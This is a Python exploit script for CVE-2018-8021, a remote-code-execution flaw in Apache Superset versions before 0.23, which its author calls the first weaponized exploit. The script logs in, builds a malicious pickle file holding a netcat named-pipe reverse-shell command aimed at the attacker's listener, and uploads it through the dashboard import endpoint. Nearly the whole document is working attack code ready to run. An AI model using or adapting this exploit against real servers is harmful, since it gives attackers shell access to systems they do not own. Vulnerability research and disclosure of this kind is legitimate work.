# Exploit Author: David May (david.may@semanticbits.com)
# Vendor Homepage: https://superset.apache.org/
# Software Link: https://github.com/apache/incubator-superset
# Version: Any before 0.23
# Tested on: Ubuntu 18.04
# CVE-ID: CVE-2018-8021
 
# I originally disclosed this to the Apache Superset team back in May, and the fix had already been 
# in place, but not backported. As far as I know, this is the first weaponized exploit for this CVE.
 
#!/usr/bin/env python
 
import sys
import os
from lxml import html
import requests
 
# Change these values to your TCP listener
myIP = &#039;192.168.137.129&#039;
myPort = &#039;8888&#039;
# Credentials must belong to user with &#039;can Import Dashboards on Superset&#039; privilege
username = &#039;test&#039;
password = &#039;test&#039;
 
# Logic in case script arguments are not given
if len(sys.argv) < 3:
    print(&#039;Verify you have started a TCP listener on the specified IP and Port to receive the reverse shell...&#039;)
    print(&#039;Script Usage:&#039;)
    print(&#039;./supersetrce.py <superset server ip> <superset port>&#039;)
    sys.exit()
     
else:
    # Script arguments
    supersetIP = sys.argv[1]
    supersetPort = sys.argv[2]
    # Verify these URLs match your environment
    login_URL = &#039;http://&#039; + supersetIP + &#039;:&#039; + supersetPort + &#039;/login/&#039;
    upload_URL = &#039;http://&#039; + supersetIP + &#039;:&#039; + supersetPort + &#039;/superset/import_dashboards&#039;
     
    # Checks to see if file that we are going to write already exists in case this is run more than once
    if os.path.isfile(&#039;evil.pickle&#039;):
        os.remove(&#039;evil.pickle&#039;)
         
    # Headers that we append to our POST requests
    headers_dict = {
        &#039;User-Agent&#039;: &#039;Mozilla/5.0 (X11; Linux x86_64; rv:58.0) Gecko/20100101 Firefox/58.0&#039;,
        &#039;DNT&#039;: &#039;1&#039;,
        &#039;Connection&#039;: &#039;close&#039;,
        &#039;Upgrade-Insecure-Requests&#039;: &#039;1&#039;,
    }
     
    # Creates evil pickle file and writes the reverse shell to it
    evilPickle = open(&#039;evil.pickle&#039;,&#039;w+&#039;)
    evilPickle.write(&#039;cos\nsystem\n(S\&#039;rm /tmp/backpipe;mknod /tmp/backpipe p;/bin/sh 0</tmp/backpipe | nc &#039; + myIP + &#039; &#039; + myPort + &#039; 1>/tmp/backpipe\&#039;\ntR.&#039;)
    evilPickle.close()
     
    # Start a session so we have persistent cookies
    session = requests.session()    
     
    # Grabs the Login page to parse it for its CSRF token
    login_page = session.get(login_URL)
    if login_page.status_code != 200:
        print(&#039;Login page not reached, verify URLs in script&#039;)
    login_tree = html.fromstring(login_page.content)
    csrf_token = login_tree.xpath(&#039;//input[@id="csrf_token"]/@value&#039;)
     
    # Form data that is sent in the POST request to Login page
    login_data = {
        &#039;csrf_token&#039; : csrf_token,
        &#039;username&#039; : username,
        &#039;password&#039; : password,
    }
     
    # Adds the Referer header for the login page
    headers_dict[&#039;Referer&#039;] = login_URL
     
    # Logon action
    login = session.post(login_URL, headers=headers_dict, data=login_data)  
     
    # Grabs the Upload page to parse it for its CSRF token
    upload_page = session.get(upload_URL)
    if upload_page.status_code != 200:
        print(&#039;Upload page not reached, verify credentials and URLs in script&#039;)
    upload_tree = html.fromstring(upload_page.content)
    csrf_token = upload_tree.xpath(&#039;//input[@id="csrf_token"]/@value&#039;)
     
    # Adds the Referer header for the Upload page
    headers_dict[&#039;Referer&#039;] = upload_URL
     
    # Upload action
    upload = session.post(upload_URL, headers=headers_dict, data={&#039;csrf_token&#039;:csrf_token}, files={&#039;file&#039;:(&#039;evil.pickle&#039;,open(&#039;evil.pickle&#039;,&#039;rb&#039;),&#039;application/octet-stream&#039;)})
     
    # Closes the session
    session.close()
    sys.exit()

